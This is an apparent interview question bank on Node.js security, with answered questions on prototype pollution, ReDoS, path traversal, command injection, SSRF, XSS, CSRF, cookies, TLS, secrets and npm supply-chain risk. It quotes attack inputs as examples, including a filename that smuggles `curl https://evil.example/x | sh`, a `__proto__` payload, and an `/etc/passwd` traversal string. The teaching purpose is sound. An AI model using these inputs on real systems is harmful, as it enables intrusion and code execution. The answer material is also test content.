# NODE08 — Security

Node.js 20/22. Questions NODE-351–NODE-400.

These questions cover prototype pollution, ReDoS, path traversal, command injection, SSRF, XSS in templates, CSRF, cookie flags, Helmet, TLS, secrets, `npm audit` and the supply chain, the permission model, `eval` and `vm`, HTTP request smuggling, rate limits, PII in logs, security headers, event-loop denial of service, `child_process` with `shell: true`, and JWTs at the HTTP layer.

A Node process is one event loop running as one user. Most of these bugs are untrusted data reaching a powerful API: the prototype chain, the filesystem, a shell, or another network call.

### NODE-351 — What prototype pollution is

**Difficulty:** Junior

**Category:** Prototype pollution

**Question:**

What is prototype pollution in a Node process, and why can one request change later requests?

**Answer:**

Prototype pollution means untrusted input writes a property onto a shared prototype, almost always `Object.prototype`. Ordinary objects inherit from that prototype, so `user.isAdmin` can be true even when that user never had the field. The prototype is process-wide, so one request changes every later request until you restart. The usual path in is a deep merge or a nested query parser copying a JSON body. What you lose is an authorization check, and sometimes more, if a library treats the extra property as a command or a file path.

**Follow-up:**

Why does a missing-property check become dangerous after this?

Answer: Code like `if (user.isAdmin)` treats a missing field as false, and JavaScript walks the prototype when the object does not own the key. After `Object.prototype.isAdmin` is true, every object that does not override it looks privileged. `Object.hasOwn(user, 'isAdmin')` reads only the object itself.

### NODE-352 — How a merge turns JSON into pollution

**Difficulty:** Intermediate

**Category:** Prototype pollution

**Question:**

`JSON.parse('{"__proto__":{"isAdmin":true}}')` does not change `Object.prototype` by itself. How does a merge make that payload global?

**Answer:**

`JSON.parse` creates an own property whose name is the characters `__proto__`. It does not call the prototype setter, so other objects stay clean. Pollution happens when your code copies that entry with bracket assignment. `target["__proto__"] = value` runs the setter. A deep merge that does `target["__proto__"]["isAdmin"] = true` writes `isAdmin` onto the shared prototype. There is a second path through `constructor`. On a normal object, `target["constructor"]["prototype"]` is `Object.prototype`, so copying `constructor.prototype.isAdmin` pollutes the process even when the merge skips a key named `__proto__`.

**Follow-up:**

Does `Object.assign` close this hole?

Answer: `Object.assign` copies own properties with ordinary assignment, so a key named `__proto__` can still change that one object's prototype. It does not walk nested `constructor.prototype` the way a recursive merge does, so any helper that recurses still needs a key policy and a current library.

### NODE-353 — Key checks and `--disable-proto`

**Difficulty:** Intermediate

**Category:** Prototype pollution

**Question:**

How do you harden a Node 20 or 22 service against prototype pollution?

**Answer:**

Treat untrusted objects as maps. Build them with `Object.create(null)` or `Map`, which have no `Object.prototype` chain to poison. When you must copy keys, skip `__proto__`, `constructor`, and `prototype`, and copy only own properties via `Object.hasOwn`. Validate bodies with a schema that strips unknown keys before any merge. Keep `qs` and Lodash current, because Express's extended query parser uses `qs`, and that package has had pollution bugs. You can also start Node with `--disable-proto=throw` so `__proto__` access fails. That flag does not stop the `constructor.prototype` path, so the key filter stays.

**Follow-up:**

When would you switch Express to the simple query parser?

Answer: `app.set('query parser', 'simple')` uses Node's flat parser, so a query string cannot build nested objects for a later merge. Use it when routes only need `?a=1&b=2`. If you depend on nested query objects, keep the extended parser, pin a patched `qs`, and still drop the dangerous keys.

### NODE-354 — What pollution becomes in real libraries

**Difficulty:** Senior

**Category:** Prototype pollution

**Question:**

If pollution only adds a property, how does it become account takeover or code execution?

**Answer:**

The extra property is dangerous when some other code trusts it. An auth check that reads `isAdmin` through the prototype grants admin to every user. A child-process wrapper that reads `options.shell` from a defaults object can start a shell. Template engines have read polluted options and compiled them into server-side code. You do not need a private exploit to treat this as a code-execution class of bug, because those gadgets already show up in common libraries. Fix the merge, and leave `Object.prototype` unfrozen unless every dependency has been tested.

**Follow-up:**

How do you confirm a suspected pollution bug without building a full exploit?

Answer: In staging, send the merge payload, then check `Object.hasOwn(Object.prototype, 'isAdmin')`. The process stays up, which is why crash monitoring misses it, so restart the worker after the check. Add a regression test that merges a body containing `__proto__` and `constructor.prototype` and expects those keys to be dropped.

### NODE-355 — ReDoS on the event loop

**Difficulty:** Junior

**Category:** ReDoS

**Question:**

What is a regular-expression denial of service in Node, and why is the event loop part of the story?

**Answer:**

ReDoS is a regular expression whose worst-case time explodes with input length, usually because of nested quantifiers and backtracking. A few dozen characters, such as a long run of `a` against `^(a+)+$`, can occupy one CPU for seconds or minutes. Node runs your JavaScript on a single thread per process. While `RegExp` is executing, that process does not run other request callbacks. Health checks time out, the orchestrator restarts the pod, and the attacker repeats it. Cap the input size, and use a pattern that stays linear, or an engine that refuses catastrophic expressions.

**Follow-up:**

Why is wrapping the match in a timer a weak primary control?

Answer: A `Promise.race` timeout does not abort `RegExp.prototype.exec` on the same thread. A worker can be terminated, and it still burns a core until then, so prefer a safe pattern or the linear-time `re2` module, and keep a worker limit only as a backstop.

### NODE-356 — Rewriting a catastrophic pattern

**Difficulty:** Intermediate

**Category:** ReDoS

**Question:**

What does a ReDoS-prone pattern look like, and how do you rewrite it?

**Answer:**

The dangerous shape is a quantifier on a group that can match the same characters in more than one way: `(a+)+`, `(a|aa)+`, or `(.+)+` on a string that almost matches and then fails. The engine tries every split before it gives up. Prefer one quantifier on a class that cannot overlap, and anchor it. A coarse email gate is `^[^@\s]+@[^@\s]+\.[^@\s]+$`, which does not nest stars. If you truly need backreferences, keep the pattern short and reject over-long input before matching. Test a near-miss of twenty to forty repeated characters in CI.

**Follow-up:**

Can a linter such as `safe-regex` be the release gate?

Answer: Use it as a hint, because those tools both miss some exponential patterns and flag some safe ones. Measure a long repeating fixture in CI, cap the string before `test` or `exec`, and do not depend on an internal V8 timeout on Node 20 or 22.

### NODE-357 — User-supplied regular expressions

**Difficulty:** Intermediate

**Category:** ReDoS

**Question:**

A search box does `new RegExp(req.query.q)`. What is wrong, and what do you ship instead?

**Answer:**

The caller controls both the syntax and the worst-case time. They can submit nested quantifiers and stall the event loop, or submit an invalid pattern and throw on every request. Characters the user thought were literal, such as `.` and `*`, also change meaning. Escape the string and search for a literal: prefix each metacharacter with a backslash, then compile that escaped source. If the product truly needs user-authored expressions, run them in RE2, cap the length, and isolate the match off the main thread. Do not save the raw pattern and later `eval` it.

**Follow-up:**

Where else do user-controlled patterns show up?

Answer: They show up in route allowlists, block rules in config, database validators, and template filters. A config an admin can edit is still untrusted if that account can be taken over, so keep patterns in source and test them with an evil fixture.

### NODE-358 — Path traversal with `path.join`

**Difficulty:** Junior

**Category:** Path traversal

**Question:**

You serve files with `path.join('/srv/uploads', req.query.name)` and `fs.readFile`. What is the bug?

**Answer:**

`path.join` and `path.resolve` normalize `.` and `..`, and they will climb out of `/srv/uploads`. A name of `../../etc/passwd` resolves outside the upload root, and `readFile` returns that file with the Node process's permissions. The same climb works with Windows backslashes. Encoding does not save a check on the raw string if you decode afterward. Express already decodes query parameters, so `%2e%2e%2f` arrives as `../`. Resolve the candidate, prove it is still inside the root, and only then open it. A prefix check on the raw user string is not that proof.

**Follow-up:**

Why is `target.startsWith(root)` still wrong after `path.resolve`?

Answer: If `root` is `/srv/uploads`, `/srv/uploads-secret/file` starts with those characters and is still outside the directory. Compare with `path.relative`, and reject `..`, a path that starts with `..` plus `path.sep`, or an absolute result. A file named `..hidden` stays allowed.

### NODE-359 — Proving a path stays inside the root

**Difficulty:** Intermediate

**Category:** Path traversal

**Question:**

What order of checks do you want in a Node 20 download handler?

**Answer:**

Resolve the root once at startup with `path.resolve`. On each request, reject an empty name and a name that contains a NUL byte. Take the name as Express already decoded it, then set `target` to `path.resolve(root, name)` and `rel` to `path.relative(root, target)`. If `rel` is `..`, starts with `..` plus `path.sep`, or is absolute, return 400 and do not open anything. `path.sep` covers Windows separators. Only then call `fs.open` or `createReadStream` on `target`, from one shared helper.

**Follow-up:**

Node already throws on NUL in paths. Why reject it yourself?

Answer: A validator can return a clean 400, while an `ERR_INVALID_ARG_VALUE` may hit a generic logger with the whole request. Node 20 rejects the NUL before the operating system sees it, so the live bugs are `..`, odd normalization, and symlinks.

### NODE-360 — Symlinks and the check-then-open race

**Difficulty:** Senior

**Category:** Path traversal

**Question:**

You reject `..` and an attacker still reads files outside the upload root. What did they use?

**Answer:**

They planted a symlink inside the root. `path.resolve` does not follow links, so the lexical check passes, and `fs.readFile` follows the link to `/etc/passwd` or to another user's files. Run `fs.realpath` on the candidate and apply the same `path.relative` test to the real path. That still has a time-of-check to time-of-use window: the link can be swapped after the check and before the open. On Linux and macOS, open the final component with `fs.constants.O_NOFOLLOW` so a symlink at the end fails. `O_NOFOLLOW` does not undo `..` components, so keep the lexical check too.

**Follow-up:**

How does `node --permission` change the damage if this check is wrong?

Answer: A narrow `--allow-fs-read` throws `ERR_ACCESS_DENIED` outside that list, while a grant of `/` or `*` does not limit traversal. Keep the relative-path and realpath checks anyway. On Node 20 the switch is `--experimental-permission`, and on Node 22 it is `--permission`.

### NODE-361 — Command injection through `exec`

**Difficulty:** Junior

**Category:** Command injection

**Question:**

Why is `` exec(`convert ${filename} out.png`) `` remote code execution when `filename` comes from a request?

**Answer:**

`child_process.exec` always runs the string in a shell: `/bin/sh -c` on Unix and `cmd.exe` on Windows. The shell parses `;`, `|`, backticks, `$()`, newlines, and quotes. A filename of `x.png; curl https://evil.example/x | sh` runs `convert` and then the attacker's command as the Node user. `execSync` has the same behavior. Pass an argument vector: `spawn('convert', [filename, 'out.png'])` or `execFile` with that same array. With the default `shell: false`, the filename is one argument and the shell never parses it. Also allowlist the executable, so the caller cannot choose `bash` as the program.

**Follow-up:**

The shell is gone and an attacker still overwrites files. What remains?

Answer: Argument injection remains, because `git`, `tar`, `ffmpeg`, and `curl` may treat a leading dash as a flag. Insert `--` before user arguments when the tool supports it, and reject values that start with `-`.

### NODE-362 — Why `shell: true` brings the shell back

**Difficulty:** Intermediate

**Category:** Command injection

**Question:**

A teammate writes `spawn(cmd, args, { shell: true })` so they can use pipes. What did they reintroduce?

**Answer:**

`shell: true` joins the command and the arguments and runs them with `/bin/sh -c` or `cmd.exe`. Metacharacters in any argument are shell syntax again, including values that looked safely separated in the array. Unix and Windows do not quote the same way, so a hand-rolled escaping helper tends to be wrong on one of them. Build pipes in Node: spawn each program with `shell` left false, and connect the streams with `stream.pipeline`. If you truly need a shell builtin, the whole command string has to be a constant in source. Do not mix that constant with request data.

**Follow-up:**

Which option undoes the safety of `execFile`?

Answer: `execFile(file, args, { shell: true })` uses a shell, so omit `shell` or set it to `false`. Also pass an explicit `env` and `cwd`, because a user-controlled environment or working directory is another write primitive.

### NODE-363 — PATH hijacking

**Difficulty:** Senior

**Category:** Command injection

**Question:**

`spawn('convert', [name, 'out.png'])` uses no shell. An attacker who can write a directory on `PATH` still gets code execution. How?

**Answer:**

A relative command name is looked up on `PATH`. If the attacker can drop an executable named `convert` in a directory that appears before the real ImageMagick, Node runs their program. Whether this is reachable depends on the Node user, the container `PATH`, and writable prefixes such as `/tmp`. Call the binary by an absolute path you resolved at startup, such as `/usr/bin/convert`, and refuse to continue if `realpath` does not land on the binary you expect. Do not take the program name from tenant configuration. A read-only root filesystem and a short `PATH` make the same attack much harder.

**Follow-up:**

How do you test that no route regressed to `shell: true`?

Answer: Wrap `spawn` and `execFile` in one module that throws when `shell` is set or the program path is not absolute, and search CI for other `child_process` imports. Keep `exec` out of application code, because it cannot take an untrusted string safely.

### NODE-364 — SSRF and cloud metadata

**Difficulty:** Junior

**Category:** SSRF

**Question:**

What is server-side request forgery, and why can `fetch(req.body.url)` expose cloud credentials?

**Answer:**

SSRF is your server making a request to a URL the attacker chose. `fetch` on Node 20 and 22 is undici, and it will call addresses the attacker cannot reach directly: loopback, private ranges, and the link-local address `169.254.169.254`. On AWS that address serves instance metadata, including IAM role credentials. GCP and Azure have equivalent endpoints. A webhook feature that GETs the metadata URL and returns the body hands those credentials over. Block link-local and metadata addresses even if you believe the cloud requires a session token, because an app that forwards headers can still complete that handshake.

**Follow-up:**

Which URL schemes besides `http:` matter?

Answer: Allow only `http:` and `https:` after `new URL()`, and reject a username or password. `file:`, and on older clients `gopher:` and `dict:`, can reach local or cleartext services, so enforce the scheme even though Node's `fetch` is narrower than a vintage client.

### NODE-365 — DNS rebinding and redirects

**Difficulty:** Senior

**Category:** SSRF

**Question:**

You resolve the hostname, reject private IPs, then call `fetch(url)`. How does the attacker still reach `127.0.0.1`?

**Answer:**

There are two gaps. DNS rebinding: your check resolves `evil.example` to a public address, then the HTTP client resolves it again and receives `127.0.0.1` because the TTL was one second. Redirects: `fetch` follows them by default, and `Location` can point at metadata or at `[::1]`. Resolve once, refuse private, loopback, link-local, and IPv4-mapped IPv6 addresses, and connect to the address you already approved. Set `redirect: 'manual'` and run the same checks on every `Location`. A custom undici lookup is how you pin that address so the client does not resolve a second time.

**Follow-up:**

Which addresses do you reject after `dns.lookup`?

Answer: Reject IPv4 loopback, `0.0.0.0/8`, RFC1918 private space, link-local `169.254.0.0/16`, and CGNAT `100.64.0.0/10`. Reject IPv6 `::1`, unspecified `::`, link-local `fe80::/10`, and unique-local `fc00::/7`, plus mapped forms such as `::ffff:127.0.0.1`. If the product only calls a fixed partner list, skip the range math and allowlist the exact hostname instead.

### NODE-366 — URL parsers as a security boundary

**Difficulty:** Intermediate

**Category:** SSRF

**Question:**

Why is a regex on the raw URL, or legacy `url.parse`, a weak SSRF defense?

**Answer:**

The client and the WHATWG parser do not agree with a homemade regex. `http://169.254.169.254.attacker.test` is not the metadata host. `http://attacker.test@169.254.169.254/` is, because the host is the part after `@`. Backslashes and encoded dots have been parsed differently by legacy `url.parse` than by `new URL()`. `url.parse` is legacy. Parse with `new URL()`, then read `protocol` and `hostname` in a normalized form. Compare that hostname to an allowlist of exact names. A substring check such as `includes('example.com')` accepts `example.com.evil.test`.

**Follow-up:**

An allowlist entry is `https://hooks.partner.com`. What do you compare?

Answer: Parse both sides with `new URL()`, require `https:` and hostname `hooks.partner.com`, and reject a username or password. Compare the parsed hostname, and decide whether every path is allowed or only a prefix you own.

### NODE-367 — XSS from unescaped templates

**Difficulty:** Junior

**Category:** Template XSS

**Question:**

Where does cross-site scripting come from in server-rendered Node templates?

**Answer:**

The template writes request or database data into HTML without encoding. In EJS, `<%= name %>` escapes and `<%- name %>` does not. In Pug, `#{name}` escapes and `!{name}` does not. In Handlebars, `{{name}}` escapes and `{{{name}}}` does not. A bio of `<script>...document.cookie...</script>` then runs in the viewer's browser. Stored XSS hits every viewer. Reflected XSS hits the person who followed the link. `HttpOnly` hides the cookie from `document.cookie`, and the script can still call your API on the same origin, with the browser attaching cookies. Escape by default, and ban raw interpolations in review.

**Follow-up:**

When is an HTML sanitizer the right tool?

Answer: Use one when the product stores real HTML, such as a rich-text editor, and run an allowlist sanitizer on write and on read with only `https:` links. For ordinary names and comments, escape the text. A regex that deletes the word `script` is not a sanitizer.

### NODE-368 — `res.send` and content type

**Difficulty:** Intermediate

**Category:** Template XSS

**Question:**

An Express route does `res.send(req.query.q)` and the team calls it a text API. Why can this be XSS?

**Answer:**

For a string, Express `res.send` sets `Content-Type` to `text/html` unless you set another type. The browser then parses the query value as HTML. That is reflected XSS even though nobody used a template. `res.json` sends JSON. `res.type('text/plain').send(value)` sends text. Also set `X-Content-Type-Options: nosniff` so a browser does not sniff a JSON body into HTML. Error handlers that `res.send(err.stack)` or echo `req.url` have the same bug and leak internals. An API that only speaks JSON should set that content type on 400 and 404 responses too.

**Follow-up:**

A markdown renderer "strips scripts." What do you still verify?

Answer: Many markdown libraries pass raw HTML through and allow `javascript:` links, so turn raw HTML off and run an allowlist if formatting remains. Serve a CSP without `'unsafe-inline'`, and test an image `onerror`, a `javascript:` link, and a raw script tag.

### NODE-369 — Content-Security-Policy as a backstop

**Difficulty:** Intermediate

**Category:** Template XSS

**Question:**

What does a Content-Security-Policy do for a Node-rendered page, and what belongs in a baseline?

**Answer:**

CSP tells the browser which origins may supply scripts, styles, images, frames, and connections. It is the backstop when an escape is missed: an injected script from another host fails if `script-src` is `'self'`. A practical baseline is `default-src 'self'`, `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`, and `form-action 'self'`, with scripts limited to `'self'`. Avoid `'unsafe-inline'` and `'unsafe-eval'`, which give injected markup a way to run. If you need an inline script, generate a fresh nonce per response and put that nonce in both the policy and the script tag.

**Follow-up:**

How do you turn CSP on without taking the site down?

Answer: Ship `Content-Security-Policy-Report-Only` first, read violations until legitimate pages are quiet, then send that policy as `Content-Security-Policy` with a per-request nonce. A static policy that adds `'unsafe-inline'` to silence reports will not stop XSS.

### NODE-370 — What CSRF is

**Difficulty:** Junior

**Category:** CSRF

**Question:**

What is cross-site request forgery against a cookie-based Node session?

**Answer:**

The browser attaches the session cookie to requests to your host even when another website caused the request. An attacker page can submit a form POST to `https://app.example/transfer`, and the victim's cookie rides along. Your server sees a normal authenticated call. The impact is whatever that route does: change an email, add a key, move money. CSRF is about ambient credentials the browser sends for you. A bearer token that only your JavaScript puts in `Authorization` is not attached by a classic form post. Cookie sessions need their own CSRF control.

**Follow-up:**

Does CORS stop CSRF?

Answer: CORS decides whether another origin's JavaScript may read the response, and a form navigation does not need to read it. Use SameSite cookies, a CSRF token, or a custom header that forces a preflight you will reject.

### NODE-371 — Where SameSite still leaves a gap

**Difficulty:** Intermediate

**Category:** CSRF

**Question:**

You set `SameSite=Lax` on the session cookie. Which CSRF cases are still open?

**Answer:**

`Lax` withholds the cookie on cross-site POSTs, and it still sends the cookie on top-level GET navigations. A state-changing GET remains forgeable. `Strict` withholds the cookie on those navigations too, which breaks some links into logged-in pages. SameSite compares sites, meaning the registrable domain, not origins. `https://evil.example.com` and `https://app.example.com` are the same site, so a subdomain you do not control can still ride the cookie. `SameSite=None` sends the cookie on cross-site requests and must be paired with `Secure`. Lax is the right default, and it is not a complete CSRF defense.

**Follow-up:**

`www.example.com` POSTs to `api.example.com`. Does Lax block that?

Answer: Those hosts share the registrable domain `example.com`, so they are same-site and a Lax cookie is sent on that POST. Leave `Domain` unset so the cookie is host-only, and still require a CSRF token.

### NODE-372 — CSRF tokens and Origin checks

**Difficulty:** Senior

**Category:** CSRF

**Question:**

How do you implement CSRF defense for an Express session API?

**Answer:**

Use a synchronizer token. Store a secret in the session, and give the same value to your own pages in a form field or to your own frontend in a header. Unsafe methods must present that token. Compare the buffers with `crypto.timingSafeEqual` after checking they are the same length. Also reject unsafe requests whose `Origin` is not your site. When `Origin` is missing, check `Referer` against the same allowlist. A custom header such as `X-CSRF-Token` forces a CORS preflight for cross-origin JavaScript. Skip deprecated `csurf`.

**Follow-up:**

Why do some teams check only `Origin` and drop the token?

Answer: Browsers send `Origin` on POST, and a strict allowlist blocks other sites, but some clients omit it and a proxy can strip it. A session token still holds in those cases, so use both and return 403 without echoing the origin into HTML.

### NODE-373 — HttpOnly, Secure, and SameSite

**Difficulty:** Junior

**Category:** Cookies

**Question:**

Which flags do you set on a Node session cookie, and what does each one stop?

**Answer:**

Pass `httpOnly: true`, `secure: true`, `sameSite: 'lax'`, and `path: '/'` to `res.cookie`. `HttpOnly` keeps `document.cookie` from reading the session. It does not stop XSS from calling your API. `Secure` sends the cookie only over HTTPS, so a plain-HTTP observer does not collect it. `SameSite=Lax` cuts off a large class of cross-site POSTs. Leave `domain` unset so the cookie belongs to that host only. Set `maxAge` to the session length you actually want. Express does not apply these flags unless you pass them. Localhost has browser exceptions for `Secure` during development. Production responses still need the flag.

**Follow-up:**

TLS ends at the load balancer and Node sees HTTP. Does `Secure` still work?

Answer: The browser enforces `Secure` from the URL the user opened, so an `https://` site will store the cookie even when Node sees HTTP. Your app still has to emit the attribute, including when `req.secure` is false behind the proxy.

### NODE-374 — `__Host-` and `__Secure-` prefixes

**Difficulty:** Intermediate

**Category:** Cookies

**Question:**

What do the `__Host-` and `__Secure-` cookie name prefixes give you?

**Answer:**

They are rules the browser applies to the cookie name. A name starting with `__Secure-` is stored only when the `Secure` attribute is set. A name starting with `__Host-` is stored only when `Secure` is set, `Path` is `/`, and there is no `Domain` attribute. If `res.cookie` violates that, the browser drops the cookie, which shows up immediately in testing. `__Host-` stops a subdomain from planting a cookie that shadows the parent host, because `Domain` is forbidden and the name is pinned to the exact host. Use `__Host-` for the session id, and still set `HttpOnly` and `SameSite` yourself.

**Follow-up:**

You rename `sid` to `__Host-sid` and sessions stop sticking. What do you check?

Answer: Confirm `Set-Cookie` has `Secure`, `Path=/`, and no `Domain`, and that the page is loaded over HTTPS, because plain HTTP causes the browser to drop a `__Host-` cookie. Also confirm the proxy is not adding `Domain` and that the app reads the new name.

### NODE-375 — Signed cookies and timing-safe compares

**Difficulty:** Intermediate

**Category:** Cookies

**Question:**

`cookie-parser` is configured with a secret and the cookie is signed. What protection is that?

**Answer:**

A signed cookie is the value plus an HMAC. The server recomputes the MAC and rejects tampering. Anyone who can see the cookie can read the value. Signing is integrity, not confidentiality. Keep passwords, raw access tokens, and personal data on the server, and put only a random session id in the cookie. If the value itself must be secret, encrypt it as a separate step. Verify the MAC with `crypto.timingSafeEqual` on two equal-length buffers. A plain `===` on strings can leak how much of the signature matched, through timing.

**Follow-up:**

`timingSafeEqual` throws when the lengths differ. How do you handle that?

Answer: An HMAC length is fixed, so reject a signature that is not that length, then compare the two digest-length buffers with `timingSafeEqual`. Every failure should take the same response path.

### NODE-376 — What Helmet changes

**Difficulty:** Junior

**Category:** Helmet

**Question:**

What does the Helmet middleware actually change, and what do teams often assume it changes?

**Answer:**

Helmet sets response headers. The useful set includes Content-Security-Policy, `X-Content-Type-Options: nosniff`, a frame-busting header, Strict-Transport-Security, Referrer-Policy, and cross-origin policies depending on the major version. It also removes `X-Powered-By`, which you can do with `app.disable('x-powered-by')`. Helmet does not validate input, stop SQL injection, stop SSRF, or configure CORS. A service that calls `helmet()` and also passes user input to `exec` is still exposed. Read the headers your installed major sets. Helmet 7 and later dropped some obsolete headers and ships a strict default CSP that you have to tune or the app will not load its scripts.

**Follow-up:**

Helmet broke the app the day it was added. What is the responsible fix?

Answer: Read the browser console and name the header, then configure that directive or a nonce so the real origins work. Turn off COEP only when you do not need cross-origin isolation, and keep nosniff, framing protection, HSTS, and CSP.

### NODE-377 — HSTS mistakes

**Difficulty:** Intermediate

**Category:** Helmet

**Question:**

How does Strict-Transport-Security help, and which settings are hard to undo?

**Answer:**

HSTS tells the browser to use HTTPS for that host for `max-age` seconds, including when the user typed `http://`. It closes SSL stripping on later visits. Send it only when every public way to reach that hostname is HTTPS. A long `max-age` together with `includeSubDomains` covers every subdomain. An HTTP-only name under the same parent then breaks. `preload`, once the parent is on the browser preload list, is sticky. Start with a short `max-age`, watch for breakage, then raise it. Helmet enables HSTS in a typical setup.

**Follow-up:**

The API is `api.example.com` and a sandbox is `http://dev.example.com`. What shape do you want?

Answer: Send HSTS on the API host without `includeSubDomains` until every subdomain is HTTPS, and do not preload `example.com` while any HTTP name must keep working. Add `includeSubDomains` only after every name under that parent speaks HTTPS.

### NODE-378 — A per-request CSP nonce in Helmet

**Difficulty:** Intermediate

**Category:** Helmet

**Question:**

How do you attach a CSP nonce with Helmet without putting a secret in the policy?

**Answer:**

Generate `crypto.randomBytes(16).toString('base64')` on each response and store it on `res.locals`. Configure Helmet's `contentSecurityPolicy` so `script-src` is `'self'` plus that nonce. Render every legitimate inline script with the same nonce attribute. Do not reuse the nonce across requests, and do not derive it from the session id. A CDN script belongs in `script-src` as an exact origin, not as `*`. Styles often need a nonce or a hash too, because CSS-in-JS injects tags. Keep `object-src 'none'` and `base-uri 'none'` so plugins and a `<base>` tag cannot retarget relative URLs.

**Follow-up:**

What does `frame-ancestors 'none'` add next to `X-Frame-Options: DENY`?

Answer: `frame-ancestors` is what modern browsers use to decide whether your page may be framed, and `'none'` blocks clickjacking. `X-Frame-Options: DENY` covers older clients, and Helmet can set both. If one partner must iframe one route, allow only that origin on that route.

### NODE-379 — TLS defaults on Node 20 and 22

**Difficulty:** Junior

**Category:** TLS

**Question:**

What TLS posture do you want for `https.createServer` and for outbound `fetch`?

**Answer:**

Leave the minimum at TLS 1.2, or set `minVersion: 'TLSv1.2'` in code. Node 20 and 22 already disable TLS 1.0 and 1.1, and they negotiate TLS 1.3 when the peer can. Keep the built-in cipher list unless compliance forces a change, because those suites move with Node's OpenSSL. Load `key` and `cert` from a secret mount, and pass `ca` for a private chain. Outbound `fetch` checks the chain and the hostname by default. If a proxy terminates TLS, the hop from the proxy to Node should be a private network or TLS as well.

**Follow-up:**

How do you confirm a deploy did not allow old protocols?

Answer: From outside, assert that only TLS 1.2 and 1.3 are accepted. Protocol fixes arrive with the Node runtime, so a frozen old minor misses them. Pin a current minor and rebuild the image on your patch cadence.

### NODE-380 — `rejectUnauthorized` and the environment override

**Difficulty:** Intermediate

**Category:** TLS

**Question:**

A staging bug disappears if you set `NODE_TLS_REJECT_UNAUTHORIZED=0`. What did you turn off?

**Answer:**

You turned off certificate verification for TLS clients in the whole process. The process will accept an expired, self-signed, or wrong-host certificate, so an on-path attacker can read or modify traffic. The environment variable covers dependencies' outbound calls, which is wider than one `https.request` option. `rejectUnauthorized` defaults to true, and hostname checks stay on with it. The fix for a private CA is to pass `ca` with that CA's certificate. The fix for a name mismatch is to call the name on the certificate. Remove the variable from production configs and from Dockerfiles.

**Follow-up:**

How do you trust one internal CA and keep verification everywhere else?

Answer: Use a dedicated `https.Agent` or undici agent for that host, with `ca` set to the private root, and use default `fetch` everywhere else. Still check the hostname. Pinning that CA usually ages better than pinning one leaf that rotates often.

### NODE-381 — Mutual TLS and service identity

**Difficulty:** Senior

**Category:** TLS

**Question:**

How do you do mutual TLS in Node, and why is "the client presented a cert" not authorization?

**Answer:**

On `https.createServer`, set `requestCert: true`, `rejectUnauthorized: true`, and `ca` to the CA that issues client certificates. After the handshake, `req.socket.authorized` means the chain validated. Authorization is the next step. Read `req.socket.getPeerCertificate()` and allow only the subject alternative names you expect. Any workload that can get a certificate from that same CA would otherwise be accepted. Map the identity to a service account in code, and fail closed when `authorized` is false. Rotate client certificates before they expire. mTLS authenticates the calling workload. It does not replace end-user login.

**Follow-up:**

Where should the private keys live?

Answer: Mount them at runtime, mode `0600`, owned by the Node user, and keep them out of git and image layers. A leaked key is a stolen machine identity until you revoke it at the CA, so that procedure has to be one you have tested.

### NODE-382 — Where secrets should live

**Difficulty:** Junior

**Category:** Secrets

**Question:**

Where should a Node service get database passwords, API keys, and signing keys?

**Answer:**

From a secret manager or the platform's secret store: a cloud secret manager, Vault, or a Kubernetes secret mounted as a file. The process reads the value at startup, or on a refresh interval, and keeps it in memory. Local development can use a gitignored `.env`. Node 20.12+ and Node 22 offer `process.loadEnvFile()` to load that file into `process.env`. Commit `.env.example` with empty placeholders, and do not bake secrets into an image with `ENV`.

**Follow-up:**

What is wrong with a default password in source when the env var is missing?

Answer: The default becomes a real credential the moment a deploy forgets the variable, and it stays in git history. Fail startup when a required secret is absent, and log the variable name only. The same rule covers JWT signing keys and cookie secrets.

### NODE-383 — How environment secrets leak

**Difficulty:** Intermediate

**Category:** Secrets

**Question:**

Secrets exist only in environment variables. Which ordinary Node behaviors still expose them?

**Answer:**

Child processes inherit `process.env` unless you pass a minimal `env` object to `spawn`. `console.log(process.env)`, a debug log of an HTTP client, or an error reporter that attaches `req.headers` will store `Authorization`, `Cookie`, and sometimes the body. Crash dumps and verbose traces can contain the environment. `util.inspect` on a request config often includes headers. A secret in a query string shows up in access logs and in `Referer`. Redact in the logger, pass a stripped environment to children, and keep secrets out of URLs. Assume a verbose log will be shipped somewhere, and rotate anything that may already be in it.

**Follow-up:**

`loadEnvFile` does not override variables that are already set. Why is that useful?

Answer: Platform-injected variables should win over a `.env` file left in the image, so a stale file cannot replace a rotated secret. Anyone who can read the file can still read the secrets. The loader is a convenience, not an access boundary.

### NODE-384 — What `npm audit` does not prove

**Difficulty:** Intermediate

**Category:** Supply chain

**Question:**

CI is green on `npm audit`. What do you know, and what do you not know?

**Answer:**

You know the lockfile does not match a vulnerability currently published in the advisory database npm consults, at the severity you configured. You do not know the application is safe. Audit misses malware that has no advisory yet, typosquats that look clean, malicious install scripts, secrets in the repo, and bugs in your own code. It also reports issues in code you never call. `npm audit fix --force` can jump major versions, so review that diff. `--omit=dev` focuses the report on production install risk.

**Follow-up:**

A critical finding is in a transitive dependency you never import. What do you do?

Answer: Confirm the locked version is inside the affected range, and prefer a parent release that bumps it. If the parent is unmaintained, pin a patched version with npm `overrides` and run tests. If the function is truly unused, record that with an expiry and revisit it.

### NODE-385 — Lockfiles, `npm ci`, and install scripts

**Difficulty:** Intermediate

**Category:** Supply chain

**Question:**

What is the supply-chain difference between `npm install` and `npm ci` in CI, and where do install scripts fit?

**Answer:**

`npm ci` installs the lockfile exactly and fails if `package.json` and the lockfile disagree. `npm install` may move within semver ranges and drift from what you reviewed. Commit the lockfile, and use `npm ci` in CI. Dependencies may run `preinstall`, `install`, and `postinstall` as your user. That is a common malware path: steal `NPM_TOKEN`, SSH keys, or cloud credentials from the build. `npm ci --ignore-scripts`, or `ignore-scripts=true` in `.npmrc`, stops them. Some native packages still need a build. Allow scripts only for packages you have checked.

**Follow-up:**

Why is `"express": "*"` or a git URL dependency a review failure?

Answer: `*` lets a later install pick a release nobody reviewed, including a hijacked one, and a git URL tracks a branch tip unless it is pinned to a commit. Pin versions, commit the lockfile, and bump dependencies in a visible diff.

### NODE-386 — Typosquatting and dependency confusion

**Difficulty:** Senior

**Category:** Supply chain

**Question:**

What are typosquatting and dependency confusion for a Node app that also uses a private registry?

**Answer:**

Typosquatting publishes a public package one character off a real name and waits for a bad import. Dependency confusion is sharper. Your manifest depends on `internal-logger`, the build talks to both a private registry and the public npm registry, and npm selects the public package when its version is higher. The attacker publishes that name at a high version, CI runs their `postinstall`, and they are inside the build. Scope private packages as `@company/internal-logger`, and map that scope to the private registry only in `.npmrc`. Commit the lockfile so a surprise tarball fails the integrity check.

**Follow-up:**

What limits the damage if one maintainer account is phished?

